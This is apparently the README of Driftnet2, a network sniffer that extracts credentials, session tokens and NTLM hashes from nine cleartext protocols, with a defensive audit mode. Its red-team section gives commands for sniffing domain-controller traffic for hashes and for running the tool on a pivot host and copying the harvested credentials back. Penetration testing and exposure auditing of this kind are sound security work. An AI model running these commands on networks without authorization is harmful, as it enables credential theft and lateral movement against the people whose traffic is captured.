# Driftnet2

**Kernel-level network sniffer & credential extractor — 9 cleartext protocols, eBPF/XDP capture on Linux, cross-platform via libpcap.**

[![CI](https://github.com/jankesec/driftnet2/actions/workflows/ci.yml/badge.svg)](https://github.com/jankesec/driftnet2/actions/workflows/ci.yml)
[![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://go.dev)
[![License](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
[![Protocols](https://img.shields.io/badge/protocols-9-green)]()
[![eBPF](https://img.shields.io/badge/eBPF-Linux%205.8+-orange)](https://ebpf.io)

> **Authorized use only.** Driftnet2 is for penetration testing, red-team
> engagements, and security research **with explicit authorization**, and for
> auditing your own networks. Capturing traffic you are not authorized to
> capture is illegal. See [Disclaimer](#disclaimer).

Driftnet2 extracts credentials, session tokens, and NTLM hashes from **live or
captured** network traffic. On Linux it can capture **in-kernel via eBPF/XDP**,
which runs ahead of userspace pcap-based tooling; on macOS/BSD (and as a Linux
fallback) it uses **AF_PACKET/libpcap**. It parses **9 cleartext protocols** —
HTTP, DNS, SMB, LDAP, FTP, Telnet, POP3, IMAP, SMTP — and flags likely DNS
tunnels in real time. A defensive [`-audit` mode](#blue-team-exposure-audit)
turns those findings into a prioritized, remediation-oriented report.

> Note on "stealth": in-kernel XDP capture reduces the footprint seen by
> userspace pcap-based tools, but it is **not** an invisibility guarantee
> against kernel-aware EDR/host monitoring. Claims are scoped accordingly.

---

## Demo (reproducible, offline)

No network access or privileges needed — a sample capture with **synthetic**
credentials (RFC 5737 documentation addresses) ships in the repo:

```bash
go build -o driftnet2 ./cmd/driftnet2
./driftnet2 -pcap examples/demo.pcap
```

```
[*] offline mode: examples/demo.pcap
[FTP] Login 192.0.2.10:198.51.100.20 → demo:Password123
[HTTP] Basic Auth 192.0.2.11:198.51.100.21 → demo:Password123
[POP3] Login 192.0.2.12:198.51.100.22 → demo@example.test:Password123
[TELNET] Session 192.0.2.13:198.51.100.23 → corp-router login: demo

[*] 4 packets processed, 4 unique credentials found in examples/demo.pcap
```

Regenerate the sample with `go run ./examples/gen`.

---

## Architecture

```
                  ┌──────────────────┐
                  │   NETWORK CARD   │
                  └────────┬─────────┘
                           │
              ┌────────────▼────────────┐
              │  eBPF XDP Hook (kernel) │  in-kernel capture (Linux),
              │  filter → ring buffer   │  ahead of userspace pcap tooling
              └────────────┬────────────┘
                           │ perf ring buffer
              ┌────────────▼────────────┐
              │     Go Userspace        │
              │  ┌──────────────────┐   │
              │  │  Protocol Parsers│   │
              │  │ HTTP/DNS/SMB/LDAP│   │
              │  │ FTP/Telnet/POP3  │   │
              │  │ IMAP/SMTP        │   │
              │  └────────┬─────────┘   │
              │           ▼             │
              │  ┌──────────────────┐   │
              │  │ Credential Parse │   │
              │  └────────┬─────────┘   │
              │           ▼             │
              │  ┌──────────────────┐   │
              │  │ TUI / JSON / PCAP│   │
              │  └──────────────────┘   │
              └─────────────────────────┘
```

On non-Linux hosts (and when the compiled XDP object is absent) the same parsers
run over an AF_PACKET/libpcap capture path — identical output, no kernel component.

---

## Extracted Credentials

| # | Protocol | Port | Credential Type | Example |
|---|----------|------|----------------|---------|
| 1 | **HTTP** | 80,443 | Basic Auth, POST form, Bearer, Cookie, Digest, NTLM | `demo:Password123` |
| 2 | **DNS** | 53 | Tunnel detection (long subdomains, high entropy) | `payload.c2.example` |
| 3 | **SMB** | 445 | NTLMv2 hash (user, domain, hashcat format) | `DOMAIN\user::hash` |
| 4 | **LDAP** | 389 | Simple bind (`cn=admin:password`) | `cn=admin,dc=corp:pass` |
| 5 | **FTP** | 21 | USER/PASS commands | `demo:Password123` |
| 6 | **Telnet** | 23 | Login prompt | `login: demo` |
| 7 | **POP3** | 110 | USER/PASS, AUTH PLAIN | `demo@example:pass` |
| 8 | **IMAP** | 143 | LOGIN command | `demo@example:pass` |
| 9 | **SMTP** | 25,587 | AUTH LOGIN / PLAIN | `demo@example:pass` |

---

## Quick Start

```bash
git clone https://github.com/jankesec/driftnet2 && cd driftnet2
go build -o driftnet2 ./cmd/driftnet2
```

**Live sniff — HTTP credentials only:**

```bash
sudo ./driftnet2 -iface en0 --proto http
```

**All protocols, save to JSON + PCAP:**

```bash
sudo ./driftnet2 -iface eth0 -w capture.pcap -output creds.json
```

**Offline PCAP analysis (no privileges):**

```bash
./driftnet2 -pcap dump.pcap --proto http,dns,ftp
```

**Linux eBPF/XDP mode (requires root, kernel 5.8+):**

```bash
make bpf                       # compile the eBPF object (needs clang)
sudo ./driftnet2 -iface eth0   # auto-detects the XDP object, falls back to AF_PACKET
```

The XDP object is located independent of the working directory: pass `-bpf
/path/to/xdp_sniff.o`, set `DRIFTNET2_BPF`, or place it next to the binary
(`<dir>/bpf/xdp_sniff.o`).

---

## Build & Test

```bash
make build        # build the binary (ldflags -s -w)
make bpf          # compile the eBPF/XDP object (Linux, needs clang)
make test         # go test ./...
make test-race    # go test -race ./...
make lint         # golangci-lint
make sec          # gosec
make cover        # coverage profile + summary
```

Requirements: Go 1.24+, libpcap headers (`libpcap-dev` on Debian/Ubuntu;
preinstalled on macOS), and `clang`/`llvm` for the optional eBPF object.

---

## Red Team Scenarios

> For use only within the scope of an authorized engagement.

**Catch cleartext protocols on internal networks:**

```bash
sudo ./driftnet2 -iface eth1 --proto ftp,telnet,pop3,smtp -w internal.pcap
```

```
[14:32:15] FTP  10.0.0.5 → 10.0.1.100:21
  ftpadmin:Spring2026!

[14:32:22] Telnet  10.0.0.12 → 192.168.1.1:23
  root:cisco123
```

**Sniff domain controller traffic for NTLM hashes:**

```bash
sudo ./driftnet2 -iface eth0 --proto smb,ldap -output hashes.json
```

```
[14:33:45] SMB  10.0.0.42 → 10.0.0.1:445
  CORP\jsmith::a1b2c3d4...
```

**Collect on an authorized pivot host, then retrieve for reporting:**

```bash
scp driftnet2 user@pivot:/tmp/driftnet2
ssh user@pivot "sudo /tmp/driftnet2 -iface eth1 -output /tmp/creds.json &"
sleep 300
scp user@pivot:/tmp/creds.json .
```

**DNS tunnel hunter — flag possible C2 hiding in DNS queries:**

```bash
sudo ./driftnet2 -iface eth0 --proto dns -v
```

```
[14:35:10] DNS  10.0.0.15 → 8.8.8.8:53
  TUNNEL: AQIDBAUG.c2.example (TXT)
```

---

## Blue Team: Exposure Audit

Add `-audit` to any run (live or offline) to get a prioritized report of the
cleartext credential exposure observed — severity and remediation instead of a
raw credential dump. `-audit-output report.json` also writes it as JSON.

```bash
./driftnet2 -pcap examples/demo.pcap -audit
```

```
Credential Exposure Audit
=========================
4 findings — 3 High, 1 Low

[HIGH] FTP — Cleartext password (1)
  Endpoints: 192.0.2.10 -> 198.51.100.20
  Fix: Disable plaintext FTP; use FTPS or SFTP.

[HIGH] HTTP — Cleartext password (1)
  Endpoints: 192.0.2.11 -> 198.51.100.21
  Fix: Enforce HTTPS/HSTS; never send Basic auth, form credentials, or tokens over cleartext HTTP.

[HIGH] POP3 — Cleartext password (1)
  Endpoints: 192.0.2.12 -> 198.51.100.22
  Fix: Enforce TLS (POP3S or STARTTLS) and disable cleartext authentication.
...
```

Severity is derived from what was captured (cleartext password / hash → High,
session token / DNS-tunnel indicator → Medium), grouped by protocol and endpoint.

---

## Comparison

| | driftnet2 | bettercap | net-creds | pcredz | tshark |
|---|:---:|:---:|:---:|:---:|:---:|
| In-kernel eBPF/XDP capture | ✓ | — | — | — | — |
| HTTP Basic + POST + Bearer + Cookie | ✓ | basic only | ✓ | — | manual |
| SMB NTLM (hashcat format) | ✓ | — | — | — | manual |
| DNS tunnel detection | ✓ | — | — | — | — |
| FTP / Telnet / POP3 / IMAP / SMTP | ✓ | — | — | — | manual |
| Offline PCAP analysis | ✓ | — | ✓ | ✓ | ✓ |
| Live PCAP write | ✓ | ✓ | — | — | ✓ |
| JSON export | ✓ | ✓ | — | — | — |
| Terminal dashboard | ✓ | ✓ | — | — | — |
| Single static-ish binary (no Python/Ruby) | ✓ ~5MB | ✓ ~15MB | — | — | ✓ |
| Cross-platform (Linux/macOS/BSD) | ✓ | ✓ | ✓ | — | ✓ |
| Actively maintained | ✓ | ✓ | 2014 | 2015 | ✓ |

Feature matrix reflects the authors' understanding of each tool's defaults at the
time of writing; other tools may cover some cells via plugins or manual dissectors.

---

## Project Structure

```
driftnet2/
├── bpf/xdp_sniff.c            eBPF XDP C program
├── cmd/driftnet2/main.go      CLI entry point
├── pkg/
│   ├── ebpf/loader.go         cilium/ebpf loader + ring buffer
│   ├── sniffer/               live/offline capture + PCAP writer (+ tests)
│   ├── protocol/protocol.go   9 protocol parsers (+ tests)
│   ├── audit/                 credential-exposure audit report (+ tests)
│   └── output/                terminal dashboard + JSON export (+ tests)
├── examples/                  reproducible demo generator + sample PCAP
├── .github/workflows/ci.yml   build/test/lint/gosec + eBPF compile
├── Makefile
└── README.md
```

---

## Contributing & Security

- Development setup, workflow, and gates: [CONTRIBUTING.md](CONTRIBUTING.md)
- Reporting a vulnerability and the authorized-use policy: [SECURITY.md](SECURITY.md)
- Release history: [CHANGELOG.md](CHANGELOG.md)

## Disclaimer

Driftnet2 is intended for **authorized penetration testing, red-team
assessments, defensive auditing, and security research only**. You are
responsible for complying with all applicable laws and for obtaining explicit
authorization before capturing any traffic you do not own. The authors accept no
liability for misuse.

## License

[MIT](LICENSE)
